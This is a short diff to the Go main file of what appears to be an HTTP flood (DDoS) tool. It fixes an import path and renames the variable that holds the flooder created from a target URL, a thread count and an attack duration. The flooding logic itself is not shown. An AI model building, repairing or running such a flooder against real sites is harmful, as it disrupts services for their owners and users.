@@ -2,7 +2,7 @@ package main
 
 import (
 	"bufio"
-	"facef/golang-httpflood/rodolfo-flood/DDOS-FLOOD/ddos"
+	"ddos-flood/ddos"
 	"fmt"
 	"log"
 	"os"
@@ -25,8 +25,8 @@ func main() {
 		log.Fatal(err)
 	}
 
-	x := ddos.NewFlooder(url, uint16(threads), uint32(attackDuration))
-	x.Flood()
+	flooder := ddos.NewFlooder(url, uint16(threads), uint32(attackDuration))
+	flooder.Flood()
 }
 
 func printIntro() {
